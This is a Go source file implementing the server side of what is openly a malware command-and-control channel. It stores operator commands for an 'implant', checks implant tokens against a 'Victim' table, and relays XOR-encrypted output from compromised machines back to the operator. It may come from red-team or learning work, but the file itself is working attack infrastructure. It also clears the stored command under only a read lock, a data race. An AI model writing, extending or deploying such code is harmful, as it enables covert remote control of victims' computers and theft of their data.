package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"sync"
)

// Because we have to wait for the implant to receive the command and actually run it, we need to store inside a Mutex so that it stays in memory
var (
	mu            sync.RWMutex
	storedCommand *Command
)

func getCommand(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()

	// Set the response content type to JSON
	w.Header().Set("Content-Type", "application/json")

	// Extract the token and username from the query parameters
	receivedToken := r.URL.Query().Get("token")
	username := r.URL.Query().Get("user")
	if receivedToken == "" || username == "" {
		http.Error(w, "Token and User are required", http.StatusBadRequest)
		return
	}

	// Retrieve the token from the database associated with the username
	var dbToken string
	err := db.QueryRow("SELECT token FROM Victim WHERE username = ?", username).Scan(&dbToken)
	if err != nil {
		if err == sql.ErrNoRows {
			http.Error(w, "User not found", http.StatusNotFound)
			return
		}
		http.Error(w, "Database error", http.StatusInternalServerError)
		return
	}

	// Check if the received token matches the token from the database
	if receivedToken != dbToken {
		http.Error(w, "Invalid token", http.StatusUnauthorized)
		return
	}

	// Define a switch statement to handle GET requests
	switch r.Method {
	case "GET":
		// If the request is a GET request, we lock the Mutex to access the command
		mu.RLock()
		defer mu.RUnlock()

		// Check if there is a command that has not been released
		if storedCommand == nil {
			http.Error(w, "No command available", http.StatusNotFound)
			return
		}

		// Marshal the command to JSON
		jsonCommand, err := json.Marshal(storedCommand)
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}

		w.WriteHeader(http.StatusOK)

		// Write the JSON command to the response
		if _, err := w.Write(jsonCommand); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}

		// Since the command is "consumed", set storedCommand to nil

	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Reset storedCommand after successful retrieval
	storedCommand = nil
}

func postCommand(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()
	w.Header().Set("Content-Type", "application/json")
	// If the request is a POST, which would ideally be the operator sending the command
	// Receive the request for the command, unmarshal it into the Command struct
	var command Command
	decoder := json.NewDecoder(r.Body)
	if err := decoder.Decode(&command); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	// With the Mutex, we store it in memory
	mu.Lock()
	storedCommand = &command
	mu.Unlock()

	w.WriteHeader(http.StatusOK)
	fmt.Println("Fetching command:", command.Input, "for Implant User:", command.ImplantUser, "From Operator:", command.Operator)
}

// Define the buffer that will store the XOR encrypted output
var outputBuffer []byte
var bufferMutex sync.Mutex

// This method will receive the output from the implant
func postOutput(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()

	// Upon receiving the output, read it and store the body
	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	// Print the body to the console
	fmt.Println("Received output:", string(body))

	// Lock the mutex and save the body in the outputBuffer
	bufferMutex.Lock()
	outputBuffer = body
	bufferMutex.Unlock()

	// If you still want to use the alert function
	alert("Received output from Implant")
}

func getOutput(w http.ResponseWriter, r *http.Request) {
	// We first unlock the stored mutex which holdes the Output struct and put it inside a variable
	bufferMutex.Lock()
	output := outputBuffer

	// Then we send off the XOR encrypted output for the Operator
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(output)

	// Clear the outputBuffer
	outputBuffer = []byte{}
	bufferMutex.Unlock()
}
